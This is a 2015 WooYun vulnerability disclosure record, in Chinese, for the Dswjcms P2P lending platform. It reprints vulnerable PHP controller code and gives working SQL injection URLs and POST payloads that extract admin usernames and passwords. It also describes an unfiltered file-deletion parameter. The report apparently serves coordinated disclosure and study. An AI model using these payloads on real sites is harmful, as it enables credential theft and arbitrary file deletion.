{"id": 84810, "wybug_id": "wooyun-2015-0141410", "wybug_title": "Dswjcms p2p网贷系统处4sql注入&amp;&amp;任意文件删除", "wybug_corp": "Dswjcms", "wybug_author": "路人甲", "wybug_date": "2015-09-24 18:10", "wybug_open_date": "2015-12-24 17:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向公众公开  简要描述： rt。官网demo 详细说明：  案例参照 http://**.**.**.**/bugs/wooyun-2015-0141209/trace/3789f61a7765dbc4f4a4c7d1b04e6095--------------------------------------------------------------------------------------#1D:/wamp/www/Lib/Action/Home/CenterAction.class.php\npublic function invest(){\t\t$this->homeVerify();\t\t$refund=M('collection');\t\t$automatic=D('Automatic');\t\t$this->assign('mid',$this->_get('mid'));\t\t$isbid=$this->bidRecords(3,0,$this->_session('user_uid'));\t\t\t$this->assign('isbid',$isbid);\t\t$isclosed=$this->bidRecords(7,0,$this->_session('user_uid'),1);\t\t$win=$this->bidRecords(9,0,$this->_session('user_uid'),1);\t\t$this->assign('win',$win);\t\t$overdue=$this->overdue($this->_session('user_uid'));//逾期信息\t\t$this->assign('overdue',$overdue);\t\t$uncollected=$this->bidRecords(11,0,$this->_session('user_uid'),1);\t\t$this->assign('isclosed',$isclosed);\t\t\t\tif($this->_get('bid') && $this->_get('mid')=='plan'){\t//还款计划\t\t\t\t$refun=$refund->where('bid='.$this->_get('bid').' and uid='.$this->_session('user_uid'))->order('time ASC')->select();\t\t\t$this->assign('refun',$refun);\t\t}\t\t$active['center']='active';\t\t$this->assign('active',$active);\t\t\t\t$this->display();    }\n$this->_get('mid') 没有过滤直接带入了查询。注册用户后 \nCenter/invest.html?mid=plan&bid=1) UNION SELECT 1,(select concat(username,0x5c,password) from ds_admin limit 1),3,4,5,6,7,8%23\n\n\n#2D:/wamp/www/Lib/Action/Home/BorrowAction.class.php\npublic function index(){\t\t$linkage=$this->borrowLinkage();\t\t$this->assign('linkage',$linkage);\t\t//标题、关键字、描述\t\t$Site = D(\"Site\");\t\t$site=$Site->field('keyword,remark,title,link')->where('link=\"'.$_SERVER['REQUEST_URI'].'\"')->find();\t\t$this->assign('si',$site);\t\t$active['borrow']='active';\t\t$this->assign('active',$active);\t\t$head='<link  href=\"__PUBLIC__/css/style.css\" rel=\"stylesheet\">';\t\t$this->assign('head',$head);\t\t$Borrow=D(\"Borrowing\");\t\t$borrow=$Borrow->where('uid='.$this->_session('user_uid').' and id='.$this->_get('mid'))->find();\t\t$borrow['data']=array_filter(explode(\",\",$borrow['data']));\t\t$this->assign('b',$borrow);\t\t$this->display();    }\n同理\nBorrow.html?mid=1) UNION SELECT 1,2,3,(select concat(username,0x5c,password) from ds_admin limit 1),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%23\n\n\n#3 D:/wamp/www/Lib/Action/Home/CenterAction.class.php\npublic function stationview(){\t\t$this->homeVerify();\t\t$msgTools = A('msg','Event');\t\t$instation=M('instation');\t\t$msgCount = $msgTools->msgSingle($this->_post('id'));\t\tif($msgCount){\t\t\t$instation->where('id='.$this->_post('id'))->save(array(\"rd\"=>1));\t\t}\t\t$count.='<div class=\"basic_single\">\t\t\t\t<h5>'.$msgCount[0]['title'].'</h5>\t\t\t\t<div>发件人：'.$msgCount[0]['hostname'].'</div>\t\t\t\t<div>发件时间：'.date('Y-m-d H:i:s',$msgCount[0]['addline']).'</div>\t\t\t\t<div>'.$msgCount[0]['msg'].'</div>\t\t\t\t<form class=\"form-horizontal\" method=\"post\" action=\"'.__ROOT__.'/Center/stationreply.html\">\t\t\t\t<input name=\"id\" type=\"hidden\" value=\"'.$this->_post('id').'\" />\t\t\t\t<input name=\"title\" type=\"hidden\" value=\"对'.$msgCount[0]['title'].'的回复\" />\t\t\t\t';\t\t\t\t//if($msgCount[0]['hostname']=='admin'){\t//系统信息不能回复\t\t\t\t\t//$count.='<div><a href=\"#\" class=\"btn disabled reply\">回复</a>';\t\t\t\t//}else{\t\t\t\t\t//$count.='<div><button class=\"btn btn-primary reply\" type=\"submit\">回复</button>';\t\t\t\t//}\t\t\t\t$count.='<a class=\"btn btn-info\" href=\"'.$_SERVER[\"HTTP_REFERER\"].'\">返回</a></button>\t\t\t\t</div>\t\t\t\t</form>\t\t\t</div>\t\t';\t\techo $count;    }\n$this->_post('id')  没有过滤 带入了查询。Center/stationview.htmlpost:id=111) UNION SELECT 1,2,3,4,5,6,7,8,user(),10,11,12,13,14%23\n\n#4/Lib/Action/Home/CenterAction.class.php\t\npublic function stationexit(){\t\t$this->homeVerify();\t\t$msgTools = A('msg','Event');\t\t$instation=M('instation');\t\t$result=$instation->where('id='.$this->_get('id'))->delete();\n\tif($result){\t\t\t $this->success(\"删除成功\"); \t\t}else{\t\t\t$this->error(\"删除失败\");\t\t}\t\t\t     }get  id delete型注入。盲注。#5D:/wamp/www/Lib/Action/SharingAction.class.php\npublic function pathExit(){\t\t$path=$this->_post('img');\t\tif(file_exists($path)){\t//存在图片\t\t\tunlink($path);\t//删除它\t\t}    }\n由于img参数无任何过滤。导致可以全站任意文件删除。   漏洞证明：  \n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-09-25 17:35 厂商回复： 暂未建立与网站管理单位的直接处置渠道,待认领. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}